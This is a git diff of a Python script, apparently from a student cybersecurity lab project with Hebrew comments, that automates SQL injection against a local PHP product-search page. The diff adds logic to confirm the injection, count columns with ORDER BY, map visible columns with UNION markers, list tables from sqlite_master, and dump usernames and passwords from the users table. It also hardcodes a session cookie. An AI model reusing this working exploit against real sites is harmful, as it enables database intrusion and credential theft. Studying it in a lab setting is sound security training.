@@ -1,14 +1,14 @@
 import requests
 from bs4 import BeautifulSoup
 import time
+import re
 
 # --- Configuration ---
 BASE_URL = "http://localhost/CyberProject" 
+#CHEAT - how do we now that we need to use prudacts page?
+#אבל תכלס אפשר לגלות את זה מחיפוש באתר בתור משתמש, ממחקר מקדים שמבצע התוקף
 PRODUCTS_URL = f"{BASE_URL}/products.php"
-
-# !IMPORTANT!: Update this with your actual PHPSESSID from the browser
-# (F12 -> Application -> Cookies -> localhost)
-COOKIES = {'PHPSESSID': 'rv82jh01b0c0pq4ift362fg6vp'}
+COOKIES = {'PHPSESSID': 'rv82jh01b0c0pq4ift362fg6vp'} #here we can use the SSID script
 
 def print_step(title, payload, explanation):
     print(f"\n\033[1;34m[STEP]: {title}\033[0m")
@@ -18,15 +18,15 @@ def print_step(title, payload, explanation):
     time.sleep(0.5)
 
 def check_for_error(html):
-    # Detect SQL errors or PHP crashes
     return "SQL Error" in html or "Fatal error" in html or "exception" in html.lower()
 
 # ==========================================
 # Script Start
 # ==========================================
 
-# --- Step 1: Sanity Check ---
-# We use %' to break the LIKE syntax syntax properly
+
+#----------------------------------------------------------------------------------------------
+# --- Step 1: cheack if SQLi exitse ---
 print_step("Sanity Check", "%'", "Sending a single quote to break the query syntax.")
 res = requests.get(PRODUCTS_URL, params={'q': "%'"}, cookies=COOKIES)
 
@@ -34,14 +34,15 @@ if check_for_error(res.text):
     print("[!] Success! The server returned an SQL error.")
 else:
     print("[-] No error returned. Check if the Session ID is valid and the site is running.")
-    # exit() # Optional: stop here if failed
+    exit()
 
-# --- Step 2: Determine Column Count ---
+
+#----------------------------------------------------------------------------------------------
+# --- Step 2: determine how much columns there are in the original query (SELECT) ---
 detected_cols = 0
 print_step("Enumeration - Column Count", "%' ORDER BY X --", "Incrementing ORDER BY until the page breaks.")
 
 for i in range(1, 10):
-    # Payload: Close the LIKE clause, then ORDER BY
     payload = f"%' ORDER BY {i} --"
     res = requests.get(PRODUCTS_URL, params={'q': payload}, cookies=COOKIES)
     
@@ -56,59 +57,87 @@ if detected_cols == 0:
     print("[-] Failed to detect column count. Defaulting to 5.")
     detected_cols = 5
 
-# --- Step 3: Extract Table Names from sqlite_master ---
-# We need to construct a UNION with NULLs for all columns except the visible one (column 2)
-# In SQLite, the metadata table is called 'sqlite_master'
-union_cols = ["NULL"] * detected_cols
-union_cols[1] = "name" # Display table name in the product name slot
-columns_str = ", ".join(union_cols)
 
-# Start with ZZZ to ensure no real products are shown, only injected data
-payload_tables = f"ZZZ%' UNION SELECT {columns_str} FROM sqlite_master WHERE type='table' --"
+#----------------------------------------------------------------------------------------------
+# --- Step 3: find wich columns we see in the browser (meanning, in the HTML) ---
+visible_indices = []
+print_step("Mapping Visible Columns", "UNION SELECT markers...", "Injecting markers and searching ONLY in visible text.")
 
-print_step("Extracting Table Names", payload_tables, "Querying sqlite_master for table names.")
-res = requests.get(PRODUCTS_URL, params={'q': payload_tables}, cookies=COOKIES)
+markers = [f"COL_{i+1}" for i in range(detected_cols)]
+markers_str = ", ".join([f"'{m}'" for m in markers])
+payload_map = f"ZZZ%' UNION SELECT {markers_str} --"
+
+res = requests.get(PRODUCTS_URL, params={'q': payload_map}, cookies=COOKIES)
 soup = BeautifulSoup(res.text, 'html.parser')
 
-# Find all product name elements (which now contain table names)
-found_elements = soup.find_all('div', class_='product-name')
-tables = [el.get_text(strip=True) for el in found_elements]
+page_text = soup.get_text() 
+
+for i, marker in enumerate(markers):
+    if marker in page_text:
+        visible_indices.append(i)
+        print(f"[+] Column {i+1} is VISIBLE on the page.")
+
+if not visible_indices:
+    visible_indices = [1, 2] 
+    print("[-] No visible columns detected in text. Using defaults.")
+
+#----------------------------------------------------------------------------------------------
+# --- Step 4: find table's names ---
+union_cols = ["NULL"] * detected_cols
+union_cols[0] = "rowid" 
+name_slot = visible_indices[0] if len(visible_indices) > 0 else 1
+union_cols[name_slot] = "printf('!!!%s!!!', name)"
+
+columns_str = ", ".join(union_cols)
+payload_tables = f"ZZZ%' UNION SELECT {columns_str} FROM sqlite_master WHERE type='table' --"
+
+print_step("Extracting Table Names", payload_tables, "Isolating names with printf.")
+res = requests.get(PRODUCTS_URL, params={'q': payload_tables}, cookies=COOKIES)
+
+tables = re.findall(r'!!!(.*?)!!!', res.text)
+tables = list(set([t for t in tables if t != "%s"]))
 
 print(f"\033[1;36m[+] Tables found in DB: {', '.join(tables)}\033[0m")
 
-# --- Step 4: Dump Users and Passwords ---
+#----------------------------------------------------------------------------------------------
+# --- Step 5: Dump Users and Passwords (גרסת ה-Article עם תיקון ה-ID) ---
 if 'users' in tables:
-    # Target the 'users' table
-    # Show 'username' in column 2 (Product Name) and 'password' in column 3 (Price)
-    
     target_cols = ["NULL"] * detected_cols
-    target_cols[1] = "username" # Title
-    target_cols[2] = "password" # Price slot
-    target_str = ", ".join(target_cols)
+    target_cols[0] = "id" 
     
+    # מיפוי אוטומטי:
+    # השם ילך לעמודה הגלויה הראשונה, הסיסמה לשנייה (אם קיימת)
+    name_slot = visible_indices[0] if len(visible_indices) > 0 else 1
+    pass_slot = visible_indices[1] if len(visible_indices) > 1 else name_slot
+    
+    target_cols[name_slot] = "username"
+    target_cols[pass_slot] = "password"
+
+    target_str = ", ".join(target_cols)
     payload_users = f"ZZZ%' UNION SELECT {target_str} FROM users --"
     
-    print_step("Data Dump - Sensitive Information", payload_users, "Extracting usernames and passwords from 'users' table.")
+    print_step("Data Dump", payload_users, "Testing if 'article' search works with unique IDs.")
     res = requests.get(PRODUCTS_URL, params={'q': payload_users}, cookies=COOKIES)
     soup = BeautifulSoup(res.text, 'html.parser')
     
+    # חזרה לשיטה המקורית: חיפוש קודם כל את ה"קופסאות"
     cards = soup.find_all('article', class_='product-card')
     
     print("\n\033[1;41;37m[!!!] BREACH RESULTS:\033[0m")
+    
     for card in cards:
+        # חיפוש פנימי בתוך כל קופסה
         name_div = card.find('div', class_='product-name')
         price_div = card.find('div', class_='product-price')
         
         if name_div and price_div:
             u = name_div.get_text(strip=True)
-            # Remove the currency symbol added by the HTML
-            p = price_div.get_text(strip=True).replace('₪', '').strip() 
+            p = price_div.get_text(strip=True).replace('₪', '').strip()
             
-            # Filter out empty results
-            if u:
+            if u and u != "NULL":
                 print(f"[*] User: {u:<15} | Password: {p}")
-                
+
 else:
-    print("[-] 'users' table not found, cannot dump passwords.")
+    print("[-] 'users' table not found.")
 
 print("\n--- Script Finished ---")
